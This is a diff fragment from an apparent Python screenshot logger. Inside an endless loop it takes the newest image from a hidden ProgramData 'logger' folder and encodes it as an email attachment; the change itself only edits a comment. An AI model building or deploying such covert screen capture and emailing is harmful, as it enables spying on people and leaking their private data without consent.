@@ -142,7 +142,7 @@ while True:
         ss_files_list = glob.glob("C:/ProgramData/logger/screenshots/*")
         ss_filename_latest = max(ss_files_list, key=os.path.getctime)
 
-        # Open and encode the attachment so it can be added to the email
+        # Encode the file
         with open(ss_filename_latest, "rb") as attachment:
             part = MIMEBase("application", "octet-stream")
             part.set_payload(attachment.read())
